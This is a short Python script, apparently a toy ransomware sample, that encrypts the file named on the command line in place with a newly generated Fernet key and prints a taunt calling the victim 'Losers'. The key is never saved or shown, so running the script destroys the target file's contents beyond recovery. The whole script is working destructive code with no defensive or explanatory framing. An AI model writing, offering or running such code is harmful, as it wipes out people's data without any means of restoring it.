from cryptography.fernet import Fernet
import os
import sys

key = Fernet.generate_key()
cipher = Fernet(key)


def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)
    return key


try:
    targetfile = sys.argv[1].strip()
    encryption_key = encrypt_file(targetfile)  
    print("Your file has been encrypted Losers! This should teach you a lesson")  
except IndexError as e:
    print(e)






